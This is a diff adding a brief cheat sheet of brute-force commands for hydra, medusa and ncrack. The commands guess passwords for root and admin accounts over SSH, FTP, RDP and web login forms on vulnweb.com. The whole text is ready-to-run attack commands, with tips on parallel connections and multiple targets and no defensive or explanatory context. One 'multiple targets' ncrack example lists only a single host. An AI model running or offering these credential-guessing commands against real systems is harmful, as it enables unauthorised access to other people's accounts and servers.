@@ -1,0 +1,26 @@
+COMMANDS:
+1.hydra:
+●SSH brute force:
+hydra -l root -P pass.txt ssh://vulnweb.com
+●FTP brute force:
+hydra -l admin -P pass.txt ftp://vulnweb.com
+●Web form brute force:
+hydra -l admin -P pass.txt vulnweb.com http-post-form      "/login:username=^USER^&password=^PASS^:F=incorrect"
+●Use multiple parallel connections (faster):
+hydra -l admin -P pass.txt -t 8 ssh://vulnweb.com
+2.medusa:
+●SSH brute force:
+medusa -h vulnweb.com -u root -P pass.txt -M ssh 
+●FTP brute force:
+medusa -h vulnweb.com -u admin -P pass.txt -M ftp
+●Web form brute force:
+medusa -h vulnweb.com -u admin -P pass.txt -M http
+●Use multiple connections:
+medusa -H hostlist.txt -u admin -P pass.txt -M ssh
+3.ncrack:
+●SSH brute force: 
+ncrack -p ssh -u root -P pass.txt vulnweb.com
+●RDP brute force:
+ncrack -p rdp -u admin -P pass.txt vulnweb.com
+●Use multiple targets:
+ncrack -p ssh -u root -P pass.txt vulnweb.com
